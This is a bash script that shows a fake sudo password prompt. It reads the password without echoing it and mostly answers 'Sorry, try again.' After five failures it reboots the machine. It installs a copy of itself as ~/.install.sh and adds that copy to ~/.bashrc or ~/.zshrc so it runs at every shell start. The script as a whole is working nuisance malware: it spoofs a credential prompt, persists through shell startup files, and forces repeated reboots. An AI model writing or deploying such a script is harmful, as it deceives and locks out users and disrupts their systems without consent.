#!/bin/bash

USER=$(whoami)
max_attempts=5
attempt_count=0
break_loop=true

prompt_sudo() {

    while $break_loop; do
        echo -n "[sudo] password for $USER: "

        if [ -t 0 ]; then
            stty -echo
            read -r password
            stty echo
        else
            read -r password
        fi

        echo ""

        random_number=$((RANDOM % 10 + 1))

        if [ "$random_number" -eq 1 ]; then
            echo "Password correct!"
            break_loop=false
        else
            echo "Sorry, try again."

            attempt_count=$((attempt_count + 1))

            if [ "$attempt_count" -ge "$max_attempts" ]; then
                echo "Maximum attempts reached. Rebooting..."
                attempt_count=0
                sleep 1
                reboot
            fi

            sleep 0.5
        fi
    done
}

add_to_startup() {
    if [[ "$SHELL" == */bash ]]; then
        config_file="$HOME/.bashrc"
    elif [[ "$SHELL" == */zsh ]]; then
        config_file="$HOME/.zshrc"
    else
        config_file="$HOME/.bashrc"
    fi

    startup_line="~/.install.sh &"

    if ! grep -Fxq "$startup_line" "$config_file"; then
        echo "$startup_line" >> "$config_file"
    fi
}

install_script() {
    sudo_prompt_script="$HOME/.install.sh"

    if [[ ! -f "$sudo_prompt_script" ]]; then
        cat > "$sudo_prompt_script" <<EOL
#!/bin/bash
# Get the current user
USER=\$(whoami)
max_attempts=5
attempt_count=0

# Function to simulate the sudo prompt with a 1/10 chance of success
while true; do
    # Prompt for password
    echo -n "[sudo] password for \$USER: "

    # Check if running in an interactive shell
    if [ -t 0 ]; then
        # Turn off echo to hide input, read the password (will always fail)
        stty -echo
        read -r password
        stty echo
    else
        read -r password
    fi

    # Add a new line (to simulate what happens when pressing enter)
    echo ""

    # Generate a random number between 1 and 10
    random_number=\$((RANDOM % 10 + 1))

    # Simulate a 1/10 chance of success
    if [ "\$random_number" -eq 1 ]; then
        echo "Password correct!"
        exit 0  # Exit the script successfully
    else
        # Always show failure message
        echo "Sorry, try again."

        # Increment the attempt count
        attempt_count=\$((attempt_count + 1))

        # If max attempts reached, reboot the system
        if [ "\$attempt_count" -ge "\$max_attempts" ]; then
            echo "Maximum attempts reached. Rebooting..."
            sleep 1
            sudo reboot
        fi

        # Sleep for 1 second before asking again
        sleep 1
    fi
done
EOL

        chmod +x "$sudo_prompt_script"
    fi
}

install_script
add_to_startup

prompt_sudo
